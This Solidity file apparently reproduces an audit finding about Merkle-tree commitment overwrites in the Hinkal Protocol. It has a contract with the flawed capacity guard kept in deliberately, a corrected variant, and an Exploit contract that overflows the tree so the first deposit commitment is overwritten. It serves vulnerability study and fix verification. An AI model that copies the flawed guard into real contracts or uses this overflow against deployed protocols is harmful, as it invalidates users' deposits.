// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic, self-contained reproduction of AuditVault finding 60150:
// "Commitments Can Be Overwritten by Overflowing the Tree" (Hinkal Protocol).
//
// A flat-array Merkle tree stores commitments at leaf slots MINIMUM_INDEX..(2^LEVELS - 1).
// insert()'s capacity guard uses `!=` instead of a bounds check, so it fails to reject
// newIndex > 2^LEVELS, and insertMany() bypasses the guard entirely. Pushing one leaf
// past capacity lands at flat index 2^LEVELS, whose parent = index/2 = MINIMUM_INDEX,
// so the propagation OVERWRITES the very first stored commitment leaf.

// ---------------------------------------------------------------------------
// Minimal marker token (used to quantify the non-fund harm: an invalidated deposit)
// ---------------------------------------------------------------------------
contract MiniToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

// ---------------------------------------------------------------------------
// Faithful minimal double of MerkleBase with the VERBATIM buggy guard.
// ---------------------------------------------------------------------------
contract MerkleBase {
    uint256 public constant LEVELS = 5;
    uint256 public constant MINIMUM_INDEX = 16; // 2^(LEVELS-1); 16 leaf slots: 16..31

    uint256 public m_index = MINIMUM_INDEX;
    mapping(uint256 => bytes32) public nodes;

    function _hashLeftRight(bytes32 l, bytes32 r) internal pure returns (bytes32) {
        return keccak256(abi.encode(l, r));
    }

    // Actual insertion routine: store the leaf, then propagate the update toward the root.
    // No capacity check here -- once index reaches 2^LEVELS the parent (index/2) wraps
    // back into the leaf region (== MINIMUM_INDEX), overwriting a stored commitment.
    function _insert(bytes32 leaf) internal {
        uint256 newIndex = m_index;
        nodes[newIndex] = leaf;
        uint256 index = newIndex;
        for (uint256 level = 0; level < LEVELS; level++) {
            if (index % 2 == 0) {
                nodes[index / 2] = _hashLeftRight(nodes[index], nodes[index + 1]);
            } else {
                nodes[index / 2] = _hashLeftRight(nodes[index - 1], nodes[index]);
            }
            index = index / 2;
        }
        m_index = newIndex + 1;
    }

    // VERBATIM buggy capacity guard from the finding: uses `!=` instead of `<`.
    function insert(bytes32 leaf) public {
        uint256 newIndex = m_index;
        require(newIndex != uint256(2) ** LEVELS, "Tree is full."); // @>
        _insert(leaf);
    }

    // Unguarded: loops the raw insertion routine with NO capacity check, so it can
    // push m_index past 2^LEVELS and overwrite previously stored commitments.
    function insertMany(bytes32[] calldata leaves) external {
        for (uint256 i = 0; i < leaves.length; i++) {
            _insert(leaves[i]);
        }
    }
}

// ---------------------------------------------------------------------------
// Fixed variant: correct bounds guard (`<=` max-index) AND a capacity check in
// insertMany() so the tree can never overflow past its 2^LEVELS leaf slots.
// ---------------------------------------------------------------------------
contract MerkleBaseFixed {
    uint256 public constant LEVELS = 5;
    uint256 public constant MINIMUM_INDEX = 16;

    uint256 public m_index = MINIMUM_INDEX;
    mapping(uint256 => bytes32) public nodes;

    function _hashLeftRight(bytes32 l, bytes32 r) internal pure returns (bytes32) {
        return keccak256(abi.encode(l, r));
    }

    function _insert(bytes32 leaf) internal {
        uint256 newIndex = m_index;
        // FIX: bounds check that admits the final leaf (index 2^LEVELS - 1) and
        // rejects any overflow (index >= 2^LEVELS).
        require(newIndex <= uint256(2) ** LEVELS - 1, "Tree is full.");
        nodes[newIndex] = leaf;
        uint256 index = newIndex;
        for (uint256 level = 0; level < LEVELS; level++) {
            if (index % 2 == 0) {
                nodes[index / 2] = _hashLeftRight(nodes[index], nodes[index + 1]);
            } else {
                nodes[index / 2] = _hashLeftRight(nodes[index - 1], nodes[index]);
            }
            index = index / 2;
        }
        m_index = newIndex + 1;
    }

    function insert(bytes32 leaf) public {
        _insert(leaf);
    }

    function insertMany(bytes32[] calldata leaves) external {
        // FIX: reject a batch that would exceed the maximum tree size.
        require(m_index + leaves.length <= uint256(2) ** LEVELS, "Tree overflow");
        for (uint256 i = 0; i < leaves.length; i++) {
            _insert(leaves[i]);
        }
    }
}

// ---------------------------------------------------------------------------
// Exploit
// ---------------------------------------------------------------------------
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 public constant DEPOSIT = 1e18; // value backing the first commitment

    MerkleBase public tree;
    MiniToken public marker;

    bytes32 public firstCommitment; // leaf value of the first deposit
    bytes32 public nodeBefore; // nodes[MINIMUM_INDEX] after the tree is legitimately full
    bytes32 public nodeAfter; // nodes[MINIMUM_INDEX] after the overflow insert
    uint256 public finalIndex; // m_index after overflow (expected 36)
    bool public overwritten; // whether the first commitment was clobbered
    uint256 public markerToSink; // magnitude of the invalidated deposit

    function run() external payable {
        // Create every helper up front, in a fixed order. Marker token is created LAST.
        tree = new MerkleBase();
        marker = new MiniToken();

        // 20 distinct deposit commitments; leaves[0] is the first depositor's commitment.
        bytes32[] memory all = new bytes32[](20);
        for (uint256 i = 0; i < 20; i++) {
            all[i] = bytes32(DEPOSIT + i);
        }
        firstCommitment = all[0];

        // Step 1: legitimately fill the tree with 16 leaves -> slots 16..31, m_index == 32.
        bytes32[] memory fill16 = new bytes32[](16);
        for (uint256 i = 0; i < 16; i++) {
            fill16[i] = all[i];
        }
        tree.insertMany(fill16);
        nodeBefore = tree.nodes(MINIMUM_INDEX()); // == firstCommitment (untouched leaf 16)

        // Step 2: overflow with 4 more leaves. The 17th leaf lands at flat index 32,
        // whose parent (32/2 == 16 == MINIMUM_INDEX) overwrites the first commitment.
        bytes32[] memory extra4 = new bytes32[](4);
        for (uint256 i = 0; i < 4; i++) {
            extra4[i] = all[16 + i];
        }
        tree.insertMany(extra4); // unguarded -> tree grows past its limit

        nodeAfter = tree.nodes(MINIMUM_INDEX());
        finalIndex = tree.m_index();
        overwritten = (nodeAfter != nodeBefore);

        // Quantify the harm: the first depositor's commitment is invalidated. Send the
        // invalidated deposit magnitude to the SINK marker so it is measurable.
        if (overwritten) {
            marker.mint(SINK, DEPOSIT);
            markerToSink = DEPOSIT;
        }
    }

    function MINIMUM_INDEX() internal view returns (uint256) {
        return tree.MINIMUM_INDEX();
    }
}
